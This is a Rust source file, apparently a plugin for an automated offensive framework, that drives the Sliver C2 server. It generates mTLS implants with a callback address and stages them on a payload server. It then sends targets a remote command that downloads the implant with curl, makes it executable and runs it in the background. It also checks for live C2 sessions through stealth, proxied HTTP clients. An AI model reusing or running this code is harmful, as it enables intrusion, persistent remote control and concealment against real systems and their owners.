use crate::plugins::{ScannerPlugin, Capability};
use crate::models::{TargetHost, Finding, Severity, Category};
use crate::utils::tool_detection::detect_tool;
use crate::core::orchestrator::c2::{C2Operator, C2Session, SessionState};
use async_trait::async_trait;
use anyhow::{Result, Context};
use tracing::{info, warn};
use std::sync::Arc;

use crate::utils::executor::{StealthExecutor, ExecutorMode};

pub struct SliverScanner<M: ExecutorMode> {
    binary_path: String,
    executor: Arc<StealthExecutor<M>>,
}

impl<M: ExecutorMode> SliverScanner<M> {
    pub fn new(executor: Arc<StealthExecutor<M>>) -> Self {
        let path = detect_tool("sliver-server");
        Self {
            binary_path: path,
            executor,
        }
    }

    async fn get_rest_client(&self) -> Result<(String, reqwest::Client)> {
        let server_hostname = std::env::var("SLIVER_SERVER").unwrap_or_else(|_| "127.0.0.1".to_string());
        
        // --- V14.2 HARDENING: DNS Resolve & Pinning ---
        let addr = tokio::net::lookup_host(format!("{}:31337", server_hostname)).await?
            .next()
            .ok_or_else(|| anyhow::anyhow!("C2 DNS resolution failed for {}", server_hostname))?;
            
        let pm = self.executor.get_proxy_manager()
            .context("Sliver requires a ProxyManager for REST API access")?;
        
        let client = crate::utils::stealth_http::StealthClientBuilder::build_pinned_infra(
            &pm, 
            &server_hostname, 
            addr
        )?;
        
        Ok((server_hostname, client))
    }
}

#[async_trait]
impl<M: ExecutorMode> C2Operator for SliverScanner<M> {
    async fn prepare_payload(&self, target: &TargetHost) -> Result<String> {
        let output_path = format!("/tmp/sliver_implant_{}_{}", 
            target.host.replace('.', "_"),
            &uuid::Uuid::new_v4().to_string()[..8]
        );
        
        let pm = self.executor.get_proxy_manager().context("Sliver requires a ProxyManager for callback tracking")?;
        let callback_ip = pm.get_managed_exits().first().cloned()
            .unwrap_or_else(|| "127.0.0.1".to_string());

        info!("🔱 V14.1 SOVEREIGN: Generating implant for {} via callback {}", target.host, callback_ip);

        let args = vec![
            "generate".to_string(),
            "--mtls".to_string(),
            callback_ip.clone(),
            "--save".to_string(),
            output_path.clone(),
        ];

        let output = self.executor.execute_and_wait(&self.binary_path, args).await?;
        if output.status.success() {
            Ok(output_path)
        } else {
            let err = String::from_utf8_lossy(&output.stderr);
            anyhow::bail!("Payload generation failed: {}", err)
        }
    }

    async fn deploy_payload(&self, target: &TargetHost, payload_path: &str) -> Result<()> {
        info!("🔱 V14.1 SOVEREIGN: Initializing Professional OTT Delivery for {}...", target.host);
        
        let pm = self.executor.get_proxy_manager().context("ProxyManager required for delivery")?;
        
        let server = crate::utils::payload_server::PayloadServer::new();
        
        // 1. Stage payload on OTT server
        let token = server.stage_payload(std::path::PathBuf::from(payload_path)).await;
        let server_port = server.start().await?;
        
        // 2. Determine delivery IP (The operator's routable IP for the target)
        // For simplicity in V14.1, we use the first managed exit or 127.0.0.1 if local testing
        let delivery_ip = pm.get_managed_exits().first().cloned().unwrap_or_else(|| "127.0.0.1".to_string());
        
        // 2.1 IP Validation (Sprint 1 Fixup)
        if delivery_ip.parse::<std::net::IpAddr>().is_err() {
            anyhow::bail!("CRITICAL: Malicious delivery IP detected: {}", delivery_ip);
        }
        
        let implant_name = std::path::Path::new(payload_path)
            .file_name().and_then(|n| n.to_str()).unwrap_or("implant");

        // 3.1 Security Sanitization (Sprint 1)
        if implant_name.starts_with('.') || !implant_name.chars().all(|c| c.is_alphanumeric() || c == '_' || c == '-' || c == '.') {
            anyhow::bail!("CRITICAL: Malicious implant name detected: {}", implant_name);
        }

        // 3. Construct the delivery vector (Professional Mode)
        let delivery_cmd = format!(
            "curl -sSL http://{}:{}/{} -o /tmp/{} && chmod +x /tmp/{} && /tmp/{} &",
            delivery_ip, server_port, token, implant_name, implant_name, implant_name
        );

        info!("🚀 V14.1 SOVEREIGN: Dispatching OTT delivery vector to remote target via executor...");

        // 4. Remote dispatch
        let output = self.executor.execute_remote(target, &delivery_cmd).await?;
        info!("✅ V14.1 SOVEREIGN: Remote delivery dispatched. Output: {}", output);

        Ok(())
    }

    async fn verify_session(&self, target: &TargetHost) -> Result<SessionState> {
        info!("🔱 V14.2 SOVEREIGN: Verifying session state for {} with mTLS check...", target.host);
        
        let (server_addr, client) = self.get_rest_client().await?;
        
        let response = client.get(format!("http://{}:31337/api/sessions", server_addr))
            .send()
            .await;

        match response {
            Ok(res) if res.status().is_success() => {
                let sessions: serde_json::Value = res.json().await?;
                if let Some(sess_list) = sessions.as_array() {
                    for sess in sess_list {
                        let remote_addr = sess.get("remote_address").and_then(|v| v.as_str()).unwrap_or("");
                        let matches_target = remote_addr.contains(&target.host) || (target.ip.is_some() && remote_addr.contains(target.ip.as_ref().unwrap()));
                        
                        if matches_target {
                            // --- V14.2 mTLS Fingerprint Verification ---
                            if let Some(expected_fp) = target.tactical_context.get("c2_fingerprint").and_then(|v| v.as_str()) {
                                let actual_fp = sess.get("certificate_fingerprint").and_then(|v| v.as_str()).unwrap_or("");
                                
                                // Typestate-style point operation for verification
                                let op = crate::core::orchestrator::c2::typestate::SliverOperator::<crate::core::orchestrator::c2::typestate::Established>::new()
                                    .with_fingerprint(expected_fp.to_string());
                                
                                if op.promote(actual_fp).is_ok() {
                                    info!("✅ V14.2 SOVEREIGN: mTLS fingerprint verified for {}", target.host);
                                    return Ok(SessionState::Sovereign);
                                } else {
                                    warn!("❌ V14.2 SOVEREIGN: mTLS Fingerprint MISMATCH for {}. Session is NOT sovereign.", target.host);
                                    return Ok(SessionState::Established);
                                }
                            }
                            
                            return Ok(SessionState::Established);
                        }
                    }
                }
                Ok(SessionState::Staged)
            }
            _ => {
                warn!("⚠️ V14.2 SOVEREIGN: REST API unreachable. Falling back to CLI session audit (UNVERIFIED).");
                let output = self.executor.execute_and_wait(&self.binary_path, vec!["sessions".to_string()]).await?;
                let stdout = String::from_utf8_lossy(&output.stdout);
                
                if stdout.contains(&target.host) || (target.ip.is_some() && stdout.contains(target.ip.as_ref().unwrap())) {
                    Ok(SessionState::Established) // CLI cannot verify mTLS safely
                } else {
                    Ok(SessionState::Staged)
                }
            }
        }
    }

    async fn list_sessions(&self) -> Result<Vec<C2Session>> {
        let (server_addr, client) = self.get_rest_client().await.context("Proxy failure")?;

        if let Ok(res) = client.get(format!("http://{}:31337/api/sessions", server_addr)).send().await {
            if res.status().is_success() {
                if let Ok(sessions_json) = res.json::<serde_json::Value>().await {
                    if let Some(list) = sessions_json.as_array() {
                        return Ok(list.iter().map(|s| C2Session {
                            id: s.get("ID").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
                            target: s.get("RemoteAddress").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
                            state: SessionState::Established,
                            last_checkin: chrono::Utc::now(),
                            fingerprint: s.get("CertificateFingerprint").and_then(|v| v.as_str()).map(|s| s.to_string()),
                        }).collect());
                    }
                }
            }
        }

        warn!("⚠️ V14.1: list_sessions falling back to CLI.");
        let output = self.executor.execute_and_wait(&self.binary_path, vec!["sessions".to_string()]).await?;
        let stdout = String::from_utf8_lossy(&output.stdout);
        
        let mut sessions = Vec::new();
        for line in stdout.lines() {
            if line.contains("ID") || line.is_empty() { continue; }
            sessions.push(C2Session {
                id: line.split_whitespace().next().unwrap_or("unknown").to_string(),
                target: "unknown".to_string(),
                state: SessionState::Established,
                last_checkin: chrono::Utc::now(),
                fingerprint: None,
            });
        }
        Ok(sessions)
    }
}

#[async_trait]
impl<M: ExecutorMode> ScannerPlugin for SliverScanner<M> {
    fn name(&self) -> &'static str {
        crate::models::PLUGIN_SLIVER
    }
    
    fn metadata(&self) -> crate::plugins::PluginMetadata {
        crate::plugins::PluginMetadata {
            name: self.name().to_string(),
            description: "Sliver C2 Operator: Sovereign HTTP-aware implant manager.".to_string(),
            target_type: crate::plugins::TargetType::Host,
            risk_level: crate::plugins::RiskLevel::High,
            layer: crate::core::capability_layer::ScanLayer::PostExploitation,
            expected_duration: std::time::Duration::from_secs(300),
            capabilities: self.capabilities(),
            cost: 10,
            category: "Lateral Movement".to_string(),
            mitre_attacks: vec!["T1105".to_string(), "T1071".to_string()],
            exploit_difficulty: crate::plugins::RiskLevel::High,
            blackarch_category: Some("backdoor".to_string()),
            is_destructive: false,
            poc_mode: false, ..Default::default() }
    }
    
    fn capabilities(&self) -> Vec<Capability> {
        vec![Capability::VulnerabilityScanning]
    }
    
    async fn check_dependencies(&self) -> Result<bool> {
        Ok(crate::utils::check_tool_availability("sliver").await)
    }
    
    async fn scan(&self, target: &TargetHost) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();
        
        let state = self.verify_session(target).await?;
        if state == SessionState::Sovereign {
            findings.push(Finding::new(
                "C2-SESSION-SOVEREIGN",
                Category::Vulnerability,
                Severity::Critical,
                &format!("🔱 mTLS Sovereign session verified for target {}", target.host),
                serde_json::json!({ "status": "active", "operator": "sliver", "protocol": "mtls" })
            ));
        } else {
            let path = self.prepare_payload(target).await?;
             findings.push(Finding::new(
                "C2-IMPLANT-STAGED",
                Category::Vulnerability,
                Severity::High,
                &format!("Sliver implant staged for autonomous deployment: {}", path),
                serde_json::json!({ "path": path, "protocol": "mtls" })
            ));
        }

        Ok(findings)
    }

    fn as_c2_operator(&self) -> Option<&dyn C2Operator> {
        Some(self)
    }
}
